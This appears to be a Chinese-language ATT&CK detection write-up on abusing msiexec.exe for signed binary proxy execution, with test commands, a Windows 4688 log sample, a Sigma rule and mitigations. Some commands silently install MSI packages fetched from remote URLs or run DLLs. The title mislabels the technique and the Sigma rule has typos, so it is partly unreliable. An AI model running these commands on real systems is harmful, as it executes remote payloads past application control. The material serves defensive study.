# T1218-002-win-签名的二进制代理执行：控制面板

## 来自ATT&CK的描述

攻击者可能滥用msiexec.exe来代理恶意有效负载的执行。Msiexec.exe是Windows安装程序的命令行实用程序，因此通常与执行安装包（.msi）相关联。Msiexec.exe由Microsoft进行数字签名。

攻击者可能滥用msiexec.exe来启动本地或网络可访问的MSI文件。Msiexec.exe还可以执行DLL。由于Msiexec.exe在Windows系统上是签名的，因此可以使用Msiexec.exe绕过不考虑其潜在滥用的应用程序控制解决方案。如果启用了AlwaysInstallElevated策略，Msiexec.exe的执行也可以提升为系统权限。

## 测试案例

来自微软的msiexec介绍：<https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec>

```yml
msiexec.exe /q /i "C:\path\xx.msi"
msiexec.exe /q /I http://8.8.4.4/xx.msi
msiexec.exe /y "C:\path\xx.dll"
```

## 检测日志

windows security

## 测试复现

仅做演示：

```yml
C:\Users\Administrator>msiexec.exe /q /I http://www.baidu.com/1.msi
```

## 测试留痕

windows 安全日志 4688

```yml
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0x9D23C

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x19c
 新进程名称: C:\Windows\System32\msiexec.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x690
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: msiexec.exe  /q /I http://www.baidu.com/1.msi
```

## 检测规则/思路

### Sigma规则

```yml
title: 使用msiexec.exe执行恶意程序
description: 攻击者可能滥用msiexec.exe来启动本地或网络可访问的MSI文件。
status: experimental
references:
    - https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msiexec 
logsource:
​    product: windows
​    service: security
detection:
​    selection:
​        EventID:
​               - 4688 #Windows 安全日志
         New Process Name: 'msiexec .exe' #Application Name
         Commanline: 
                - '/q'
                - '/y'
                - '/i'
​    condition: selection
level: low
```

## 建议

使用进程监控来监视msiexec.exe的执行和参数。将msiexec.exe的最近调用与已知良好自变量和执行的MSI文件或DLL的先前历史进行比较，以确定异常和潜在的对抗活动。在调用msiexec.exe之前和之后使用的命令参数在确定正在执行的MSI文件或DLL的来源和用途方面也可能很有用。

## 缓解措施

1. 禁用或删除功能或程序：将Msiexec.exe的执行限制为需要使用它的特权帐户或组，以减少恶意使用的机会。
2. 特权账户管理：将Msiexec.exe的执行限制为需要使用它的特权帐户或组，以减少恶意使用的机会。

## 参考推荐

MITRE-ATT&CK-T1218-007

<https://attack.mitre.org/techniques/T1218/007/>

跟着ATT&CK学安全之defense-evasion

<https://snappyjack.github.io/articles/2020-01/%E8%B7%9F%E7%9D%80ATT&CK%E5%AD%A6%E5%AE%89%E5%85%A8%E4%B9%8Bdefense-evasion>
